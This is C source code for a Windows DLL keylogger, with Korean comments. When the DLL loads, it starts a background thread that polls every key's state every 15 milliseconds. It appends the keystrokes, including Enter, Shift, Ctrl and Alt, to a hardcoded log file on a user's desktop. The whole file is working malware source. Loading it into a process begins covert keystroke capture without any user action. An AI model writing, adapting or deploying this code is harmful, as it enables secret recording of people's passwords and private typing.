#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"

// 전역 변수: 키 상태 추적
static BOOL g_keyState[256] = {0};

void LogKey(int vkCode) {
    FILE* fp = fopen(LOG_FILE, "a");
    if (!fp) return;

    // 영문자, 숫자
    if ((vkCode >= 0x41 && vkCode <= 0x5A) || (vkCode >= 0x30 && vkCode <= 0x39)) {
        fputc((char)vkCode, fp);
    }
    // 특수 키
    else if (vkCode == VK_SPACE) fputc(' ', fp);
    else if (vkCode == VK_RETURN) fprintf(fp, "[ENTER]\n");
    else if (vkCode == VK_BACK) fprintf(fp, "[BACK]");
    else if (vkCode == VK_TAB) fprintf(fp, "[TAB]");
    else if (vkCode == VK_SHIFT) fprintf(fp, "[SHIFT]");
    else if (vkCode == VK_CONTROL) fprintf(fp, "[CTRL]");
    else if (vkCode == VK_MENU) fprintf(fp, "[ALT]");

    fflush(fp);
    fclose(fp);
}

DWORD WINAPI KeyloggerThread(LPVOID param) {
    // 시작 로그 (PID 포함으로 중복 확인)
    FILE* fp = fopen(LOG_FILE, "a");
    if (fp) {
        fprintf(fp, "\n=== Keylogger Started (PID: %d) ===\n", GetCurrentProcessId());
        fclose(fp);
    }

    // 메인 루프
    while (1) {
        for (int vk = 8; vk < 256; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            BOOL isPressed = (state & 0x8000) != 0;
            
            // 키가 새로 눌렸을 때만 기록
            if (isPressed && !g_keyState[vk]) {
                LogKey(vk);
                g_keyState[vk] = TRUE;
            }
            // 키가 떼어졌을 때
            else if (!isPressed && g_keyState[vk]) {
                g_keyState[vk] = FALSE;
            }
        }
        
        Sleep(15);  // 15ms 대기
    }
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    }
    return TRUE;
}
